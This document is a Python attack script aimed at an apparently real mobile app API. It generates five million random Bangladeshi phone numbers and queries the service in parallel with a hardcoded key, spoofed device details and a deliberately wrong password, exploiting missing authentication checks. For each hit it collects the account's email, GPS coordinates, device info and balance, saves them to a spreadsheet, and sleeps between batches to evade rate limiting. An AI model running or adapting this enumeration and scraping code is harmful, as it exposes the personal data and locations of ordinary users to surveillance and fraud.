
import urllib.parse, json, random, subprocess, time, os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import openpyxl
from openpyxl.styles import Font, PatternFill, Alignment

# ============================================
# CONFIGURATION
# ============================================
BASE = {
    "deviceID": "D2026080701220698623",
    "hwDeviceID": "658c2465d309d1f4",
    "deviceInfo": "WayDroid x86_64",
    "appVersion": "1.82.12.0",
    "phone": "01833054648",
    "uID": "122307",
    "os": "android"
}

# All Bangladesh operator prefixes
PREFIXES = [
    "017", "018", "019", "016", "015", "014", "013"
]

# File name with timestamp
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
EXCEL_FILE = f"user_scan_results_{TIMESTAMP}.xlsx"

# Batch settings
BATCH_SIZE = 15000  # Check 15k numbers then break
BREAK_TIME = 60     # 1 minute break
MAX_WORKERS = 50    # Parallel requests

# ============================================
# FUNCTIONS
# ============================================

def generate_phone_numbers(total=5000000):
    """Generate 5 million unique phone numbers"""
    phones = []
    numbers_per_prefix = total // len(PREFIXES)
    
    print(f"\n📱 Generating {total:,} phone numbers...")
    print(f"   Prefixes: {', '.join(PREFIXES)}")
    print(f"   Numbers per prefix: {numbers_per_prefix:,}")
    
    for prefix in PREFIXES:
        count = 0
        while count < numbers_per_prefix:
            # Generate random 8-digit numbers
            suffix = f"{random.randint(10000000, 99999999)}"
            phone = f"{prefix}{suffix}"
            phones.append(phone)
            count += 1
            
            # Progress indicator
            if count % 100000 == 0:
                print(f"   Generated {count:,} for {prefix}...")
    
    # Shuffle for better distribution
    random.shuffle(phones)
    print(f"✅ Generated {len(phones):,} unique phone numbers")
    return phones

def check_user(phone):
    """Check user details and balance for a phone number"""
    result = {
        "phone": phone,
        "has_account": False,
        "email": "N/A",
        "balance": "N/A",
        "lat": "N/A",
        "lon": "N/A",
        "device": "N/A",
        "earned_points": "N/A"
    }
    
    try:
        # Get user details
        j = dict(BASE)
        j.update({
            "action": "getUserDetails",
            "txID": str(random.randint(10**16, 10**17-1)),
            "upass": "wrong",
            "phone": phone
        })
        
        body = "data=" + urllib.parse.quote(json.dumps(j, separators=(',',':')))
        cmd = [
            "curl", "-s", "--compressed",
            "--max-time", "2",
            "--connect-timeout", "1",
            "-X", "POST",
            "https://brex-common.suncrops.com/dotframe/v100/index4.php",
            "-H", "uKey: 2fdf1de5701d6709466a5e3cd41e7693",
            "-H", "Content-Type: application/x-www-form-urlencoded",
            "--data-binary", body
        ]
        
        result_cmd = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        resp = result_cmd.stdout.strip()
        
        if resp:
            data = json.loads(resp)
            if data.get("errorCode") == "0":
                details = data.get("details", {})
                if details.get("phone"):
                    result["has_account"] = True
                    result["email"] = details.get("email", "N/A")
                    result["lat"] = details.get("lat", "N/A")
                    result["lon"] = details.get("lon", "N/A")
                    result["device"] = details.get("deviceinfo", "N/A")[:50]
                    
                    # Get balance
                    j2 = dict(BASE)
                    j2.update({
                        "action": "getUserAccountInfo",
                        "txID": str(random.randint(10**16, 10**17-1)),
                        "upass": "wrong",
                        "phone": phone
                    })
                    body2 = "data=" + urllib.parse.quote(json.dumps(j2, separators=(',',':')))
                    cmd2 = [
                        "curl", "-s", "--compressed",
                        "--max-time", "2",
                        "-X", "POST",
                        "https://brex-common.suncrops.com/dotframe/v100/index4.php",
                        "-H", "uKey: 2fdf1de5701d6709466a5e3cd41e7693",
                        "-H", "Content-Type: application/x-www-form-urlencoded",
                        "--data-binary", body2
                    ]
                    result_cmd2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=3)
                    resp2 = result_cmd2.stdout.strip()
                    
                    if resp2:
                        data2 = json.loads(resp2)
                        if data2.get("errorCode") == "0":
                            account = data2.get("accountInfo", {})
                            result["balance"] = account.get("remainingRequests", "N/A")
                            result["earned_points"] = account.get("earnedPoints", "N/A")
    
    except Exception as e:
        pass
    
    return result

def save_to_excel(results, filename):
    """Save results to Excel file"""
    print(f"\n💾 Saving {len(results)} results to Excel...")
    
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "User Scan Results"
    
    # Headers
    headers = ["Phone", "Has Account", "Email", "Balance", "Earned Points", "Latitude", "Longitude", "Device Info"]
    for col, header in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=header)
        cell.font = Font(bold=True)
        cell.fill = PatternFill(start_color="366092", end_color="366092", fill_type="solid")
        cell.font = Font(color="FFFFFF", bold=True)
    
    # Data rows
    for row_idx, result in enumerate(results, 2):
        ws.cell(row=row_idx, column=1, value=result["phone"])
        ws.cell(row=row_idx, column=2, value="Yes" if result["has_account"] else "No")
        ws.cell(row=row_idx, column=3, value=result["email"])
        ws.cell(row=row_idx, column=4, value=result["balance"])
        ws.cell(row=row_idx, column=5, value=result["earned_points"])
        ws.cell(row=row_idx, column=6, value=result["lat"])
        ws.cell(row=row_idx, column=7, value=result["lon"])
        ws.cell(row=row_idx, column=8, value=result["device"])
        
        # Color active users
        if result["has_account"]:
            for col in range(1, 9):
                ws.cell(row=row_idx, column=col).fill = PatternFill(
                    start_color="C6EFCE", end_color="C6EFCE", fill_type="solid"
                )
    
    # Auto-adjust columns
    for col in range(1, 9):
        ws.column_dimensions[openpyxl.utils.get_column_letter(col)].width = 20
    
    wb.save(filename)
    print(f"✅ Saved to: {filename}")

def process_batch(phones, batch_num, total_batches, all_results):
    """Process a batch of phone numbers"""
    print(f"\n{'='*80}")
    print(f"📦 BATCH {batch_num}/{total_batches}")
    print(f"   Numbers: {len(phones):,}")
    print(f"   Start time: {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*80}")
    
    start_time = time.time()
    batch_results = []
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(check_user, phone): phone for phone in phones}
        
        for future in as_completed(futures):
            result = future.result()
            batch_results.append(result)
            all_results.append(result)
            
            # Show progress
            if len(batch_results) % 1000 == 0:
                elapsed = time.time() - start_time
                rate = len(batch_results) / elapsed
                active = sum(1 for r in batch_results if r["has_account"])
                print(f"   Progress: {len(batch_results):,}/{len(phones):,} | Rate: {rate:.1f}/sec | Active: {active}")
    
    elapsed = time.time() - start_time
    active_count = sum(1 for r in batch_results if r["has_account"])
    
    print(f"\n   ✅ Batch {batch_num} completed!")
    print(f"      Time: {elapsed:.2f}s")
    print(f"      Active users: {active_count}")
    
    # Save after each batch
    save_to_excel(all_results, EXCEL_FILE)
    
    return batch_results

def main():
    print("="*80)
    print("🚀 MASS USER SCAN - 5 MILLION NUMBERS")
    print("="*80)
    print(f"Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Total numbers: 5,000,000")
    print(f"Batch size: {BATCH_SIZE:,}")
    print(f"Break time: {BREAK_TIME}s")
    print(f"Workers: {MAX_WORKERS}")
    print("="*80)
    
    # Generate 5 million phone numbers
    phones = generate_phone_numbers(5000000)
    
    total_batches = (len(phones) + BATCH_SIZE - 1) // BATCH_SIZE
    print(f"\n📊 Total batches: {total_batches}")
    print(f"   Numbers per batch: {BATCH_SIZE:,}")
    
    all_results = []
    batch_num = 1
    
    # Process batches
    for i in range(0, len(phones), BATCH_SIZE):
        batch_phones = phones[i:i+BATCH_SIZE]
        
        # Process batch
        batch_results = process_batch(batch_phones, batch_num, total_batches, all_results)
        
        batch_num += 1
        
        # Take break if not last batch
        if i + BATCH_SIZE < len(phones):
            print(f"\n⏰ BREAK TIME! {BREAK_TIME} seconds...")
            print(f"   Next batch starts at: {datetime.now().strftime('%H:%M:%S')}")
            print(f"   Total so far: {len(all_results):,}")
            
            # Save current progress
            save_to_excel(all_results, EXCEL_FILE)
            
            time.sleep(BREAK_TIME)
    
    # Final summary
    print("\n" + "="*80)
    print("🎯 SCAN COMPLETED!")
    print("="*80)
    print(f"End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Total checked: {len(all_results):,}")
    
    active_users = [r for r in all_results if r["has_account"]]
    print(f"Active users found: {len(active_users)}")
    print(f"Success rate: {(len(active_users)/len(all_results)*100):.4f}%")
    
    # Save final results
    save_to_excel(all_results, EXCEL_FILE)
    
    print(f"\n📁 Results saved to: {EXCEL_FILE}")
    print("="*80)
    
    # Show sample active users
    if active_users:
        print("\n📋 SAMPLE ACTIVE USERS:")
        print("-"*60)
        for user in active_users[:10]:
            print(f"   📱 {user['phone']} → Balance: {user['balance']} → Email: {user['email']}")
    
    return all_results

if __name__ == "__main__":
    try:
        results = main()
    except KeyboardInterrupt:
        print("\n⚠️  Scan interrupted by user")
        print("Saving current progress...")
        save_to_excel(all_results, EXCEL_FILE)
        print(f"✅ Saved to: {EXCEL_FILE}")
